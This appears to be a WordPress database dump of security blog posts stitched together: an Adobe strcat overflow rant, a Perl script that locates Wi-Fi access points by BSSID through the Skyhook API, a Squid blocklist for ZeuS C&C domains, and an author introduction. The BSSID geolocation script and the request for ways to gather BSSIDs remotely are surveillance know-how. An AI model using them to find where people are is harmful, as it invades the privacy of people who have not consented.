I\'m referring just to the SING table one).\n\nAnyway, a penetration testing company named <a href=\"https://www.rafzar.com/\" rel=\"nofollow\" target=\"_blank\">Ramz Afzar</a> has released an <a href=\"https://www.rafzar.com/node/22\" rel=\"nofollow\" target=\"_blank\">unofficial patch</a> to fix the Adobe vulnerability, because apparently Adobe has had a difficult time figuring one out on their own.\n\nAfter reading their analysis of the vulnerable code, this jumped out at me the most:\n<!--more-->\n<blockquote>\nAfter initial analysis we\'ve discovered that exploit exists in insecure strcat call located in CoolType.dll:\n(all addresses and names are from Latest Acrobat 9.3.4\'s CoolType.dll)\n\n0803DDAB E8 483D1300 CALL JMP.&MSVCR80.strcat\n</blockquote>\n\nSo, what does \'strcat\' do, exactly?  It basically appends a copy of the source string to the destination string.  Example:\n\n<pre lang=\"c\">\nmain () {\n  char adobe_rulez[20];\n  strcpy (adobe_rulez,\"our \");\n  strcat (adobe_rulez,\"software \");\n  strcat (adobe_rulez,\"pwnz! \");\n}\n</pre>\n\nPretty self explanatory.  HOWEVER.  What DOESN\'T \'strcat\' (or any of the other strc* functions, for that matter) do?  Bounds checking!  This is a classic overflow due to idiotic programming practices.  Really, Adobe?  The 15 years of hounding from security researchers haven\'t been enough for you to ingrain it into your programmers that the use of strc* will get them fired, or lynched, or burned at the stake?  Beyond that, your entire testing/debugging department missed this as well?\n\nHeres\' what they SHOULD be doing:\n\n<pre lang=\"c\">\n#define MAXLEN(s) ( sizeof(s)/sizeof(s[0]) - 1 )\n\nchar buf[20];\n\nvoid write( char data[], int n ) {\n   strncat( buf, data, __min( n, MAXLEN(buf)-strlen(buf)) );\n}\n\nmain() {\n   strcat(buf, \"now it looks like \");\n   write(\"we know what we\'re doing\");\n}\n</pre>\n\nNote:  The above code is just an example - I don\'t even know if it will compile or not.  The idea is simple, though.  You define the size of a buffer and you want to ensure that the data going in to that buffer doesn\'t exceed the size of the buffer.  What a concept.  Bounds checking is nothing new, so there are plenty of resources out there to educate those who are unfamiliar with it.  But, if you\'re getting paid big bucks as a programmer for a company, you should know what the hell you\'re doing.  Sorry, that\'s just my personal opinion.  *cough*.\n\nAnyway, So, first they\'re writing code using functions that have been known to be vulnerable to exploitation for about 15 years and second, they\'re now being shown up by little companies who are writing patches to fix the holes that they\'re not.  And apparently Adobe thinks it\'s okay for this vulnerability to be left unpatched until the 4th of October??  Are you kidding me??\n\nI caught some grief when I wrote the <a href=\"http://www.attackvector.org/an-open-letter-to-microsoft/\">Open Letter to Microsoft</a> post about how it\'s difficult to write code in a team setting and that it\'s difficult for large companies to meet deadlines and whatnot, but honestly, how do you argue with this?\n\nAnd, whats more, is that a company that does not have access to the source code of the DLL was able to fix the issue, yet the company responsible for the software is not/wont/doesn\'t care/can\'t find a way to patch it on an expedited schedule?  Seriously, this October 4th date is really feels like a, \"Eh, we don\'t mind that all of our customers are vulnerable to exploitation and corporate espionage.. we\'ll patch it when we get around to it\" kind of date.\n\nWhats more, is that Adobe has apparently released a statement telling people to not install 3rd party patches or from \"untrusted\" publishers.  So, instead, just remain vulnerable until we get off our ass and do something about it.\n\nTell you what, Adobe, if you can\'t figure out how to simply add some bounds checking to a routine and release a patch, I think maybe you are the \"untrusted publisher\".\n\nSo, here are your options:\n\n1) Uninstall Adobe (highly recommended.  Once this vulnerability is patched, there will be 6 more released, I\'m sure - <a href=\"http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=adobe&filter_author=&filter_platform=0&filter_type=0&filter_port=&filter_osvdb=&filter_cve=\" rel=\"nofollow\" target=\"_blank\">here\'s a list</a> of all the vulnerabilities and associated exploits against Adobe products.  Look at how many came out in the past 60 days (granted, a chunk of them are DLL hijacking, but even ignoring those ones...))  Some options to replace Adobe include:\n     A) Install the Google Docs plugin and read your PDF\'s from within Google Docs (this is what I do)\n     B) Install one of the many other software packages out there:  \n         * Evince\n         * Foxit (Foxit is often vulnerable to the same issues as Adobe, though, so be a bit weary of this one)\n         * Okular\n         * GSView\n         * Xpdf\n         * NitroPDF\n         * SumatraPDF\n         * Please note that I haven\'t used all of these, so if you have any input on them, please comment below\n2) Install <a href=\"https://www.rafzar.com/customers/patches/CoolType.tgz\" rel=\"nofollow\">this patch</a>\n3) Or wait around for Adobe to do something about it, meanwhile leaving you vulnerable to attack.  Though, I\'m sure there\'s nothing important on your computer that you wouldn\'t mind being stolen, right?\n\nSorry about this rant, I\'m just getting tired of these companies writing absolutely terrible code, laughing at us as they head off to the bank with our money and then not taking it seriously when they get flooded with vulnerability discoveries.  I\'m looking forward to the day when some big company gets pwned due to a vulnerability in a piece of software that a publisher has had ample time to patch and then gets sued for damages.  That\'s when the face of internet security will change, because I guarantee that if you assign a price tag to apathy, we will begin to see same-day patches.\n\nOh, wait, we do already see that.. with Linux.  *plug*.  ;-)','','2010-09-20 10:59:44','2010-09-20 15:59:44','','','2010-09-20 10:59:44','2010-09-20 15:59:44','really-adobe','0','','publish','Really, Adobe?','post',''),(

I\'ve opted to use the Skyhook service instead because there\'s far more documentation and sample code that exists using this API, whereas I was unable to find anything too terribly helpful when it came to using the GLS API for this particular purpose.  If anyone has any insight on this, please, please, let me know.  I\'d like to incorporate that into this script for comparison data.\n<!--more-->\nOk, so, how does this work, exactly?  Both companies (Google & Skyhook) have employed a large number of people to drive around with laptops, GPS\'s, and cameras attached to the roofs of their car in order to create a database.  Everyone is aware of street view by Google, but were you aware of the fact that they also record wireless information?  Well, I guess probably most people are aware of that now, considering the issues they had in Germany, but what you probably weren\'t aware of is what this data is used for.  Google and Skyhook both provide this database for software based location systems.\n\nSo, whats in the database?  Skyhook is pretty open about the fact that they\'re collecting wifi data in order to provide better location services.  They call it \"XPS\", which combines information from wifi, GPS, and cell phone towers to pin point an exact location.\n\n<center><img src=\"http://www.skyhookwireless.com/images/content/charts/xps.gif\"></center>\n\nAnyway, what does that mean for us?  It means that we can query this database with a BSSID from a wireless network and get the nearest address and coordinates returned.  Thanks SkyHook!  :-)\n\nHere\'s an example.  Not too long ago I was in the cities and did some driving with a buddy of mine.  I\'ll demonstrate this using a BSSID that was in the log created on that drive:\n\n<blockquote>\n$ ./getloc.pl 00:24:B2:1E:24:FE\n490 Robert St N\nRamsey county\nSt. Paul, Minnesota 55101\nLatitude: 44.95063\nLongitude: -93.0940583\nhttp://maps.google.com/maps?f=q&source=s_q&hl=en&geocode=&q=44.95063+-93.0940583&sll=37.0625,-95.677068&sspn=57.815136,114.169922&ie=UTF8&t=h&z=17\n</blockquote>\n<p></p>\n\nSo, using just the BSSID I\'m able to get a house number (in this case, a building number), street address, and the coordinates.\n\nHere\'s my code.. feel free to modify it/add to it/whatever.. but if you add anything cool, please let me know.  :-)\n\n<pre lang=\"perl\">\n#!/usr/bin/perl\n# www.attackvector.org\n# \nuse LWP::UserAgent;\nuse XML::LibXML;\n\n$url = \"https://api.skyhookwireless.com/wps2/location\";\n$ua = LWP::UserAgent->new;\n$handler = XML::LibXML->new();\n\n$bssid= $ARGV[0];\n$bssid =~ s/://g;\n\nif($bssid eq \"\") {\n print \"Usage: $0 <bssid>n\";\n print \"Example: $0 AA:BB:CC:DD:EE:FFn\";\n exit(0);\n}\n\nsub response {\n    my ($response) = @_;\n    $xml = $response->content;\n    $xml =~ s/n//g;\n    $page = $handler->parse_string($xml);\n    if((@{$page->getElementsByTagName(\'longitude\')}[0]) ne \"\") {\n        $lat = $page->getElementsByTagName(\'latitude\');  \n        $long = $page->getElementsByTagName(\'longitude\');\n        $streetnum = $page->getElementsByTagName(\'street-number\');\n        $streetname = $page->getElementsByTagName(\'address-line\');\n        $city = $page->getElementsByTagName(\'city\');\n        $zip = $page->getElementsByTagName(\'postal-code\');\n        $co = $page->getElementsByTagName(\'county\');  \n        $state = $page->getElementsByTagName(\'state\');\n        print \"$streetnum $streetnamen\";\n        print \"$co countyn\";\n        print \"$city, $state $zipn\";\n        print \"Latitude: $latn\";  \n        print \"Longitude: $longn\";\n        print \"http://maps.google.com/maps?f=q&source=s_q&hl=en&geocode=&q=\" . $lat . \"+\" . $long . \"&sll=37.0625,95.677068&sspn=57.815136,114.169922&ie=UTF8&t=h&z=17n\";\n    } else {\n        print \"No results for $bssidn\";\n    }\n}\n\n$request = \"<?xml version=\'1.0\'?>  \n<LocationRQ xmlns=\'http://skyhookwireless.com/wps/2005\' version=\'2.6\' street-address-lookup=\'full\'>  \n  <authentication version=\'2.0\'>  \n    <simple>  \n      <username>beta</username>  \n      <realm>js.loki.com</realm>  \n    </simple>  \n  </authentication>  \n  <access-point>  \n    <mac>$bssid</mac>  \n    <signal-strength>-50</signal-strength>  \n  </access-point>  \n</LocationRQ>\";\n$response = $ua->post( $url, \'Content-Type\' => \'text/xml\', Content => $request );\nresponse($response); \n</pre>\n\nIf you come up with or know of any creative ways to remotely obtain a BSSID, please comment below.

I wont even bother with excuses.  BUT, here\'s a post to prove that I still know what I\'m doing!  :-D\n\nSo, if you\'ve been following some of the other blogs (specifically, <a href=\"http://krebsonsecurity.com/2011/03/spyeye-zeus-users-target-tracker-sites/?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+KrebsOnSecurity+%28Krebs+on+Security%29\" ref=\"noindex\" target=\"_blank\">Krebs</a>), you\'ve probably seen the hubbub about <a href=\"https://zeustracker.abuse.ch/\" ref=\"noindex\" target=\"_blank\">ZeusTracker</a>.  If not, I highly recommend you click on that previous link and go read.  It\'s long, but quite interesting.\n\nZeuS, if you\'re unaware, is a big botnet that\'s used heavily in cyber crime.  You don\'t want to get infected by this.  To those who manage networks:  You don\'t want your users to get infected by this.\n\n<!--more-->\n\nZeusTracker is watching for Zeus C&C traffic via honeypots and documenting the known hosts/domains/IP\'s associated with them.  They\'ve created a nice list that can be easily imported in to iptables, Windows host files, Squid, et. al.\n\nI run Squid on one of the gateways here, so I decided to utilize that to implement this blacklist.  Squid makes this incredibly simple, which is also a big plus.\n\nIn your Squid config file, you\'ll see a section that\'s all about ACL\'s (access control lists).  If you scroll down far enough, you\'ll see a section that says:\n\n<blockquote>\n# INSERT YOUR OWN RULE(S) HERE TO ALLOW ACCESS FROM YOUR CLIENTS\n</blockquote>\n\nSo, the simplest way to implement a blacklist is by adding the following just below that comment.  Mine looks like this:\n\n<pre lang=\"c\">\n# ZeuS C&C domains\nacl blocksites url_regex \"/etc/squid/zeus.txt\"\nhttp_access deny blocksites\n</pre>\n\nPretty simple, eh?\n\n\'Course, now you have to create the \"zeus.txt\" file, otherwise that rule isn\'t going to do you any good.  If you go to <a href=\"https://zeustracker.abuse.ch/blocklist.php\" ref=\"noindex\" target=\"_blank\">here</a>, you\'ll see a list of files that all contain the hosts & ip\'s that ZeusTracker knows about.  In this case, you want the one formatted for Squid.\n\nNow, you\'ll need for this to update, say, daily, so you\'ll need to create a script and invoke it via Crontab.  Here\'s my stupid-simple script:\n\n<pre lang=\"bash\">\n#!/bin/sh\n\n/bin/rm /etc/squid/zeus.txt\n/usr/bin/curl \"https://zeustracker.abuse.ch/blocklist.php?download=squidblocklist\" >> /etc/squid/zeus.txt\n/etc/init.d/squid restart\n</pre>\n\nIt simply deletes the current zeus.txt file, downloads the newest version via Curl, and then restarts Squid.\n\nThis is a really quick & easy way to (help) protect your network from this trojan/worm/whatever you want to call it.  I\'ve noticed recently that even a user who is running a fully patched version of Windows (Vista), with Google Chrome, this thing is still capable of infecting the machine.  I haven\'t found any real good information on how, but from what I\'ve witnessed, it appears to be a Java exploit.\n\nAnyway, give this a shot!\n','','2011-03-10 14:56:15','2011-03-10 19:56:15','','','2011-03-10 14:56:15','2011-03-10 19:56:15','lets-see-if-i-still-remember-how-to-do-this','0','','publish','Lets see if I still remember how to do this...','post','');

I was a regular reader of this site and enjoyed reading Matt’s postings.\r\n\r\nA little about me, I’ve been in the U.S. military for 5 years, worked as a government contractor for a few years and now work as a consultant through my own company, Guarded Horizons Inc.   Altogether,  I’ve been in the IT &amp; security world for 12 years now and was considering getting into blogging so this seemed like a good opportunity to give it a shot.   I also wanted to see the site continuing to offer security related information.  A lot of what I do nowadays is security and network architecture design and deployment. I’d like to get more into pen-testing and security research.\r\n\r\nI’ve launched two websites over the last 6 months to a year and now spend a good deal of my time managing everything associated with it. The idea behind the VPN services I offer is to provide security/privacy when you are in public or open WiFi hotspots, in hotels, or traveling outside the U.S. Another use when you are overseas is that it will allow you to access U.S. content that is normally blocked (Netflix, Hulu, Pandora, etc).\r\n\r\nYou can check them out at <a href=\"http://www.tunnelguard.com\" rel=\"nofollow\">http://www.tunnelguard.com</a> and <a href=\"http://www.apovpn.com\" rel=\"nofollow\">http://www.apovpn.com</a>\r\n\r\nAPOVPN is geared more towards the American &amp; military community living abroad. TunnelGuard is for everyone else. Basically I was getting a lot of questions about what the heck APO means. If you’re not associated with the military or government, it really doesn’t make sense and just sounds like a funny word <img src=\"https://www.attackvector.org/wp-includes/images/smilies/icon_wink.gif\" alt=\";-)\" />\r\n\r\nAs far as the site content and moving forward, I moved over all of the site content I could.
